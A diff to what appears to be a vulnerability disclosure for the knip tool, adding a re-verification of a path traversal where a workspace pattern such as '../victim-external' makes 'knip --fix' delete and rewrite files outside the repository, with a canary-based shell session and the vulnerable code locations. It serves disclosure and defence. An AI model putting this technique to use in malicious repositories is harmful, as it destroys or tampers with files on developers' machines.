@@ -88,7 +88,32 @@ exit code: 0
 
 ![Knip path traversal evidence](Knip_Workspaces_Config_Path_Traversal_File_Deletion_Overwrite_poc.png)
 
-### Impact
+### Real-Environment Verification (2026-10-06)
+
+Re-verified against the **released npm artifact** (`knip@6.39.0`, the version users actually install). A fixture repo declared a workspace pointing outside its boundary (`"../victim-external"`), and a victim directory contained canary files:
+
+```
+$ cd attacker-repo && knip --no-progress
+Unused files (1)
+../victim-external/secret.ts
+Unused exports (1)
+unusedVictimExport  ../victim-external/src/helper.ts:2:14
+
+$ knip --fix --fix-type files,exports --allow-remove-files
+../victim-external/secret.ts  (removed)
+unusedVictimExport  ../victim-external/src/helper.ts:2:14  (removed)
+
+$ ls ../victim-external            # OUTSIDE the attacker repo
+package.json  src                  <- secret.ts GONE
+$ cat ../victim-external/src/helper.ts
+const unusedVictimExport = "CANARY-export";   # export keyword stripped
+```
+
+The released knip analyzed — and, with `--fix`, **deleted and rewrote** — files in a directory outside the repository, driven purely by the attacker-chosen workspace pattern. `mapWorkspaces` (`src/util/map-workspaces.ts`) globs the pattern and joins it to the cwd with no containment check, and the fixer (`IssueFixer.ts:52` `rm(issue.filePath)`) acts on the resulting out-of-bound paths.
+
+![Real-environment verification](RealEnv_knip.png)
+
+## Impact
 
 A victim who clones a malicious repository and runs the completely standard `npx knip --fix` (a normal step in lint/CI workflows) suffers deletion and tampering of files and directories outside that repository — sibling projects, SSH keys, configuration files, or anything adjacent to the clone location, limited only by the process's filesystem permissions. Deletion of unreferenced files is silent and immediate (no confirmation), making this a practical supply-chain-style destruction/tampering primitive; combined with overwritten source files it can also inject code into other projects on the developer's machine.
 
